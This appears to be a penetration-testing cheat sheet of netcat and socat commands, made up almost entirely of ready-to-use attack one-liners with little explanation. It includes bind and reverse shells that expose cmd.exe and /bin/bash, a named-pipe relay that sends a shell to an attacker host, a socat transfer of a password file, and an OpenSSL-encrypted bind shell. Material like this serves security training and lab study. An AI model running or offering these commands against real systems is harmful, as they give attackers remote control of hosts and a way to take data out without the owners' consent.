netcat and socat

Transferring files:

~~~bash
nc -nlvp 4444 > incoming.exe

nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
~~~

Binding session to process/executable:

~~~bash
nc -nlvp 4444 -e cmd.exe

nc -nv 10.11.0.22 4444

nc -v -n 10.10.14.32 7777 -e C:\windows\System32\cmd.exe
~~~

Reverse Shell:

~~~bash
nc -nlvp 4444

nc -nv 10.11.0.22 4444 -e /bin/bash
~~~

Netcat Relay (for netcat without -e option)

~~~bash
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc <ATTACKERIP> <ATTACKERPORT> 1>/tmp/backpipe
~~~

NetCat vs SoCat

~~~bash
nc <remote server's ip address> 80

socat - TCP4:<remote server's ip address>:80
~~~

~~~bash
nc -lvp localhost 443

socat TCP4-LISTEN:443 STDOUT
~~~

SoCat File Transfers

~~~bash
socat TCP4-LISTEN:443,fork file:secret_passwords.txt

socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
~~~

SoCat Reverse Shells

~~~bash
socat -d -d TCP4-LISTEN:443 STDOUT

socat TCP4:10.11.0.22:443 EXEC:/bin/bash
~~~

SoCat Encrypted Bind Shells

~~~bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem

socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

socat - OPENSSL:10.11.0.4:443,verify=0
~~~

